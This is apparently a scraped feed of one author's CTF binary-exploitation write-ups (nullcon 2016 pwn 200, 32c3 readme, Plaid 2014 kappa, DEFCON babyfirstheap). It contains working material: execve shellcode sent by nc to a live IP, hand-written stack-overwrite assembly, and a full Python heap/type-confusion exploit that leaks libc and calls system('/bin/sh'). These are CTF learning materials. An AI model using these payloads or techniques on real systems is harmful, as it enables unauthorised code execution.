item.title: 2016 nullcon pwn 200
item.description:
recently, I challenge nullcon 2016. when hold ctf, i catched pwnable.However, pwn 100 is arm exploit that i can’t solve. So i decide to challengepwn 200.
at frist, pwn 200 seem very easy:) . analyzing it, i think that this is sandbox. it was first time for me.

Analysis

this binary conserve with process using pipe. parent process could not exploit because it is sandbox that only use syscall(exit, read, write). 

if ( read(0, &buf, 4uLL) > 0 )
  {
    v3 = (char *)buf;
    v11 = (char *)mmap(0LL, buf, 7, 34, -1, 0LL);
    if ( !v11 )
      __assert_fail("psc != ((void *)0)", "sandman.c", 0xCAu, "main");
    v13 = 0;
    while ( buf )
    {
      v3 = &v11[v13];
      v12 = read(0, v3, buf);
      if ( v12 < 0 )
        break;
      v13 += v12;
      buf -= v12;
    }
    if ( !buf )
    {
      LODWORD(v4) = seccomp_init(0LL, v3);
      v10 = v4;
      if ( v4 )
      {
        v12 = seccomp_rule_add(v10, 2147418112LL, 0LL, 0LL);
        if ( v12 >= 0 )
        {
          v12 = seccomp_rule_add(v10, 2147418112LL, 1LL, 0LL);
          if ( v12 >= 0 )
          {
            v12 = seccomp_rule_add(v10, 2147418112LL, 60LL, 0LL);
            if ( v12 >= 0 )
            {
              v12 = seccomp_rule_add(v10, 2147418112LL, 231LL, 0LL);
              if ( v12 >= 0 )
              {
                v5 = v10;
                v12 = seccomp_load(v10);
                if ( v12 >= 0 )
                {
                  v9 = v11;
                  ((void (__fastcall *)(__int64, signed __int64))v11)(v5, 2147418112LL);
                }
              }
            }
          }
        }
      }
    }
  }


parent process call custom function at final. in order to exploit, use to non sandbox(child process) So, i create assembly code to pipe write.
and then, i analyze child function. there are some inputs in child function.

inputs in child function

1st input: most input 0x0e
2nd input: buffer size limited 0x1000
3rd input: buffer had to start “http://” <----- heap buffer

Vulnerable

after input, heap buffer(3rd input) is copied dest buffer(rbp-0x220).yet, heap buffer is possible 0x1000. it overwrite rip !!!! :)

int __fastcall sub_400BAC(__int64 a1)
{
  int result; // eax@1
  char *v2; // rax@4
  char *v3; // rax@6
  size_t v4; // rax@9
  char dest; // [sp+10h] [bp-220h]@9
  size_t v6; // [sp+210h] [bp-20h]@2
  char *nptr; // [sp+218h] [bp-18h]@2
  char *v8; // [sp+220h] [bp-10h]@1
  unsigned __int16 v9; // [sp+22Eh] [bp-2h]@1

  v9 = 80;
  v8 = (char *)&unk_401194;
  result = strncmp((const char *)a1, "http://", 7uLL);
  if ( !result )
  {
    nptr = (char *)(a1 + 7);
    v6 = a1 + strlen((const char *)a1);
    while ( (unsigned __int64)nptr > v6 )
    {
      if ( *nptr == 0x3A )
      {
        v2 = nptr++;
        *v2 = 0;
        v9 = atoi(nptr);
      }
      else if ( *nptr == 0x2F )
      {
        v3 = nptr++;
        *v3 = 0;
        v8 = nptr;
        break;
      }
      ++nptr;
    }
    nptr = (char *)(a1 + 7);
    v4 = strlen((const char *)(a1 + 7));
    strncpy(&dest, (const char *)(a1 + 7), v4);
    result = sub_400B97((__int64)&dest, v9);
  }
  return result;
}


However, finding shellcode address is very hard. on this account, i faild to solve pwn 200 during nullcon ctf

after finish ctf, i noticed that fork process share same address.
http://stackoverflow.com/questions/5365580/fork-same-memory-addresses
i saved stack. then stack overwrite rip :P. 

%define FD 4
section .text
global _start
_start:
    lea r9, [rsp-0x100]    <------ save stack
        mov qword rsi,0x602070 
        mov edi, 1
        mov qword rax, 1
        mov qword rdx, 8
        syscall
    
    mov qword rsi, 0x602068
    mov edi, 1
    mov qword rax, 1
    mov qword rdx, 8
    syscall

        mov rax, 1                                                                                                    
        mov edi, 1                                                                                                    
        mov qword rsi,0x4011f4                                                                                        
        mov rdx, 4                                                                                                    
        syscall                                                                                                       
                                                                                                                      
        xor rax, rax                                                                                                  
        xor edi, edi                                                                                                  
        mov qword rdx, 4                                                                                              
        mov qword rsi, 0x602008                                                                                       
        syscall                                                                                                       
                                                                                                                      
        mov qword rax, 1                                                                                              
        mov edi, FD                                                                                                   
        mov qword rsi, 0x602008                                                                                       
        mov qword rdx, 4                                                                                              
        syscall
    
    sub rsp, 0x600
    mov rax, 0
    mov edi, 0
    mov rsi, rsp
    mov rdx, 0x500
    syscall
    mov qword [rsp+0x234], r9 <-------- overwrite rip
    mov qword rax, 1                                                                                              
        mov edi, FD                                                                                                   
        mov qword rsi, rsp                                                                                            
        mov qword rdx, 0x500                                                                                          
        syscall                                                                                                       
        add rsp, 0x600                                                                                                
                                                                                                                      
        xor rax, rax                                                                                                  
        xor edi, edi                                                                                                  
        mov qword rsi, 0x6020b8                                                                                       
        mov rdx, 119                                                                                                  
        syscall                                                                                                       
                                                                                                                      
        mov qword rax, 1                                                                                              
        mov edi, 1                                                                                                    
        mov qword rsi, 0x6020B8                                                                                       
        mov qword rdx, 119                                                                                            
        syscall


exploit


(python -c 'print ("\x0e")'; python -c 'print (open("shell.bin").read()+"A"*2360)'; python -c 'print ("\x0e"+"\x60\x02\x00\x00"+"http://"+"\x90"*(0x220-
49)+"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"+"\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"+"\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"+"\x58\x0f\x05"+"C"*8+"\x6c\x11\x40"+"\x00"*5)';cat)|nc 52.72.171.221 9982

item.title: 32c3 pwn[200] readme write up
item.description:
after 32c3 ctf, i am sorry that sovled readme. so i challenge it again this binary is likely to analysis,but i am too stupid to can’t solved

At first, unfortunately i had thought puts null byte leak(like codegate 2014 nuclear)but IO_gets generate \x00 in string lately After many tries, i find out that infomation leak from “ stack smashing detected ”

above printing show argv[0] possible to overwirte. argv[0] pointer is located on $rsp+0x218

so i execute Poc

however, flag string is going to overwrite on second input, so i searched another flag string. fortunately,another string was exist.

gdb-peda$ x/s 0x400d20 0x400d20: “32C3_TheServerHasTheFlagHere…”

unfortunately!!!! i Can’t show flag in remote server…. finally i open other write up, i notice ‘LIBC_FATAL_STDERR_=1’ above the environment variable it make that show error messege on remote server

this is final payload

item.title: Plaid ctf kappa[275] in 2014
item.description:
i recently prepare Codegate held in 2016,So i needed to write up ctf. i writed up ezhp(plaid ctf), now it’s time to write up kappa. Let’s start breaking kappa

Kappa is Pokemon Game binary

there are 1-5 select that can choose. opening binary with IDA pro, i could see select function and Battle function.

first select function is Battle system with wild Pokemon it is algorithm that encounter pokemon with ‘an’ sequence(0: fail, 1: Kakuna, 2: charizar) [a1 = 0, a2 = 1, a3 = 0, a4 = 1, a5 = 0 …… a13 = 2]

wild Pokemon is producted with other function. this function product struct using malloc. this method can become vulnerability on UAF. for now, i perceived it vulnerabilty

i find out vulnerability in Battle function that wild producted function include. it is type confusion.

this vulnerability is happened when i throw pokeball to wild pokemon with filling all of pokeball room

it ignore their type, blindly cover type field. then attacker can overflow in select 5

change artwork function change each other pokemon artwork(heap+15). if i cover type using vunlerblilty.

kakuna struct: |name| art |0x878|hp|attack|technic|func_ptr

charizar struct: |name| art |0x204|hp|attack|technic|func_ptr

Do you find out?

i change charizar to kakuna, set free func_ptr using above function

this is final payload 

from pwn_expoit import *
def libc():
    s = Netcon('192.168.224.152',4444)
    recvuntil(s,"artwork")
    for i in range(1,5):
        s.send("1\n")
        recvuntil(s,"artwork")
        s.send("1\n")
        recvuntil(s,"3. Run")
        s.send("2\n")
        recvuntil(s,"Pokemon?")
        s.send("name\n")
        recvuntil(s,"artwork")
    for i in range(1,3):
        s.send("1\n")
        recvuntil(s,"artwork")
        s.send("1\n")
        recvuntil(s,"3. Run")
        s.send("2\n")
        recvuntil(s,"Pokemon?")
        s.send("shot\n")
        recvuntil(s,"5. name")
        s.send("2\n")
        recvuntil(s,"artwork")
    s.send("1\n")
    recvuntil(s,"3. Run")
    s.send("1\n")
    recvuntil(s,"3. Run")
    s.send("1\n")
    recvuntil(s,"3. Run")
    s.send("1\n")
    recvuntil(s,"3. Run")
    s.send("1\n")
    recvuntil(s,"3. Run")
    s.send("2\n")
    recvuntil(s,"Pokemon?")
    name = "/bin/sh\x00"
    s.send(name+"\n")
    recvuntil(s,"5. name")
    s.send("3\n")
    recvuntil(s,"artwork")
    s.send("5\n")
    recvuntil(s,"5. name")
    s.send("3\n")
    dat  = ""
    dat += "A"*509
    dat += p32(0x8048512)
    dat += p32(0x8048766)
    dat += "C"*1610
    s.send(dat+"\n")
    recvuntil(s,"artwork")
    s.send("3\n")
    r = u32(recvuntil(s,"artwork")[0xf85:0xf89])
    argv = []
    argv.append(s)
    argv.append(r)
    return argv
def pwn(s,r):
    s.send("5\n")
    recvuntil(s,"5. name")
    s.send("3\n")
    libc_base = r-0xdabd0
    system = libc_base + 0x40190
    print "libc_base : "+hex(libc_base)
    print "system : "+hex(system)
    dat  = ""
    dat += "A"*513
    dat += p32(system)
    dat += "C"*1610
    s.send(dat+"\n")
    recvuntil(s,"artwork")
    s.send("3\n")
    recvuntil(s,"Attack: Tackle")
    interact(s)
argv = libc()
pwn(argv[0],argv[1])

item.title: exploit-exercise fusion level4
2015 DEFCON babyfirstheap
item.description:
This binary how to using doubler free bug rather than finding vuln '

for ( i = 0; i <= 0x13; ++i )
  {
    printf("[FREE][address=%X]\n", *(&v4 + 2 * i));
    free((void *)*(&v4 + 2 * i));
  }

when open binary to hex-rays, i could see that successive free. it is very vulnerable So i debuged binary, then i faced segment fault

i hereby control got overwrite.(specific technic about this vuln that referencehttps://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf
